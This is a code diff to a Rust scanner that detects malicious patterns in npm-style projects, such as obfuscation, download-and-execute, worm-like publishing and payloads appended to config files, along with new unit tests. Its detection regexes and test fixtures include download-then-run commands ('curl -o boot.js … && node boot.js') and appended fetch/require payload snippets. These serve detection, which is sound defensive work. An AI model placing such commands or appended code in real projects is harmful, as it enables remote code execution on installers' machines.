@@ -39,10 +39,10 @@ macro_rules! lazy_re {
 
 // --- Obfuscation ---
 lazy_re!(global_dyn_re, r"(?:global|globalThis|process)\s*(?:\[|\.)\s*['\w!]+\s*\]?\s*=");
-lazy_re!(
-    esm_shim_re,
-    r"global\s*(?:\[[^\]]+\]|\.\w+)\s*=\s*(?:require|module)\b|createRequire\s*\(\s*import\.meta\.url"
-);
+// The re-entry shim is `global[...]=require` / `global.x=module`. A bare
+// `createRequire(import.meta.url)` is legitimate ESM interop and is NOT flagged
+// on its own — the reassignment is the value-independent tell.
+lazy_re!(esm_shim_re, r"global\s*(?:\[[^\]]+\]|\.\w+)\s*=\s*(?:require|module)\b");
 lazy_re!(charcode_re, r"String\.fromCharCode\s*\(\s*\d+(?:\s*,\s*\d+){3,}");
 lazy_re!(decoder_re, r"_\$_[0-9a-f]{4,}");
 lazy_re!(evalish_re, r"\beval\s*\(|new\s+Function\s*\(|\batob\s*\(");
@@ -117,8 +117,26 @@ lazy_re!(
     exec_sink_re,
     r"\|\s*(?:sh|bash)\b|node\s+-e\b|node\s+-\b|chmod\s+\+x|bun\s+run\b|sh\s+-c\b|\beval\s*\("
 );
+// A file the command downloads to disk (`curl -o x.js`, `> x.sh`) and, separately,
+// a file it then executes (`node x.js`). When the same script name appears in both,
+// it is download-and-run even without a piped `| sh` sink.
+lazy_re!(dl_target_re, r#"(?:-o|-O|--output|>)\s*['"]?([\w./@-]+\.(?:[cm]?js|sh|py|ps1))"#);
+lazy_re!(run_target_re, r#"(?:node|bun|sh|bash|python3?|powershell|\.)\s+(?:-\S+\s+)*['"]?([\w./@-]+\.(?:[cm]?js|sh|py|ps1))"#);
 fn download_exec(content: &str) -> bool {
-    fetch_tok_re().is_match(content) && exec_sink_re().is_match(content)
+    if !fetch_tok_re().is_match(content) {
+        return false;
+    }
+    if exec_sink_re().is_match(content) {
+        return true;
+    }
+    let dls: std::collections::HashSet<&str> = dl_target_re()
+        .captures_iter(content)
+        .map(|c| c.get(1).unwrap().as_str())
+        .collect();
+    !dls.is_empty()
+        && run_target_re()
+            .captures_iter(content)
+            .any(|c| dls.contains(c.get(1).unwrap().as_str()))
 }
 
 // --- Propagation ---
@@ -138,7 +156,11 @@ fn propagation(content: &str, surface: Surface) -> bool {
     }
     let auto_run = matches!(
         surface,
-        Surface::LifecycleScript | Surface::WorkflowFile | Surface::DerivedScript | Surface::GitHook
+        Surface::LifecycleScript
+            | Surface::WorkflowFile
+            | Surface::DerivedScript
+            | Surface::GitHook
+            | Surface::TasksJson
     );
     publish_re().is_match(content) && (auto_run || cred_re().is_match(content))
 }
@@ -154,6 +176,47 @@ fn on_chain_resolve(content: &str) -> bool {
 }
 
 // --- TrailingCode (ConfigFile / DerivedScript only) ---
+/// Byte offset just past the end of the `export default …` / `module.exports = …`
+/// statement that starts at `start`. String-aware balanced scan of `(){}[]`, stopping
+/// at the matching close, or a `;`/newline at depth 0. This keeps a legitimate
+/// multi-line object body from being mistaken for appended payload.
+fn export_statement_end(content: &str, start: usize) -> usize {
+    let mut depth: i32 = 0;
+    let mut seen_open = false;
+    let mut quote: Option<char> = None;
+    let mut escaped = false;
+    for (off, c) in content[start..].char_indices() {
+        let abs = start + off;
+        if let Some(q) = quote {
+            if escaped {
+                escaped = false;
+            } else if c == '\\' {
+                escaped = true;
+            } else if c == q {
+                quote = None;
+            }
+            continue;
+        }
+        match c {
+            '\'' | '"' | '`' => quote = Some(c),
+            '(' | '{' | '[' => {
+                depth += 1;
+                seen_open = true;
+            }
+            ')' | '}' | ']' => {
+                depth -= 1;
+                if seen_open && depth <= 0 {
+                    return abs + c.len_utf8();
+                }
+            }
+            ';' if depth <= 0 => return abs + c.len_utf8(),
+            '\n' if depth <= 0 && seen_open => return abs,
+            _ => {}
+        }
+    }
+    content.len()
+}
+
 fn trailing_code(content: &str, surface: Surface) -> bool {
     if !matches!(surface, Surface::ConfigFile | Surface::DerivedScript) {
         return false;
@@ -162,21 +225,29 @@ fn trailing_code(content: &str, surface: Surface) -> bool {
         .iter()
         .filter_map(|m| content.rfind(m))
         .max();
-    let tail = match marker {
-        Some(i) => &content[i..],
+    let start = match marker {
+        Some(i) => i,
         None => return false,
     };
-    let after = tail.split_once('\n').map(|(_, rest)| rest).unwrap_or("");
-    let meaningful: String = after
+    let end = export_statement_end(content, start);
+    // Everything after the completed export statement — on the same line or the
+    // following lines — is candidate trailing payload. Exclude comments and further
+    // import/export declarations (legitimate named exports are not injected code).
+    let meaningful: String = content[end..]
         .lines()
-        .filter(|l| {
-            let t = l.trim();
-            !t.is_empty() && !t.starts_with("//") && !t.starts_with("/*") && !t.starts_with('*')
+        .map(|l| l.trim())
+        .filter(|t| {
+            !t.is_empty()
+                && *t != ";"
+                && !t.starts_with("//")
+                && !t.starts_with("/*")
+                && !t.starts_with('*')
+                && !t.starts_with("export ")
+                && !t.starts_with("import ")
         })
         .collect::<Vec<_>>()
         .join("\n");
-    meaningful.len() > 8
-        && (meaningful.contains('(') || meaningful.contains('=') || meaningful.contains("require"))
+    meaningful.len() > 8 && meaningful.contains('(')
 }
 
 // --- DestructiveWipe ---
@@ -374,6 +445,44 @@ mod tests {
         let cfg = "export default { plugins: {} }\n;(function(){require('https')})()";
         assert!(score(cfg, Surface::ConfigFile).trailing_code);
         assert!(!score("export default { plugins: {} }\n", Surface::ConfigFile).trailing_code);
+    }
+
+    #[test]
+    fn trailing_code_false_on_multiline_config_with_url() {
+        // A benign multi-line config whose object body spans lines and embeds a URL
+        // must NOT be treated as trailing payload (was a false Critical).
+        let cfg = "import { defineConfig } from 'vite'\nexport default defineConfig({\n  plugins: [react()],\n  server: { proxy: { '/api': 'https://api.example.com' } },\n})\n";
+        assert!(!score(cfg, Surface::ConfigFile).trailing_code);
+        assert!(!gate(Surface::ConfigFile, &score(cfg, Surface::ConfigFile)));
+    }
+
+    #[test]
+    fn trailing_code_true_on_same_line_append() {
+        // Payload appended on the SAME line after the export body must still trip.
+        let cfg = "module.exports={};(function(){fetch('http://x')})()";
+        assert!(score(cfg, Surface::ConfigFile).trailing_code);
+    }
+
+    #[test]
+    fn obfuscation_ignores_bare_create_require() {
+        // Legitimate ESM interop is not obfuscation on its own.
+        assert!(!score(
+            "import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\nexport default {};\n",
+            Surface::ConfigFile
+        )
+        .obfuscation);
+    }
+
+    #[test]
+    fn propagation_on_tasksjson_publish() {
+        assert!(score("npm publish --access public", Surface::TasksJson).propagation);
+    }
+
+    #[test]
+    fn download_exec_download_then_run() {
+        assert!(score("curl -o boot.js http://x/b && node boot.js", Surface::LifecycleScript).download_exec);
+        // Unrelated download + a build step running a different local file must not fire.
+        assert!(!score("curl -o logo.png http://x/l && node build.js", Surface::LifecycleScript).download_exec);
     }
     #[test]
     fn destructive_wipe_detected() {
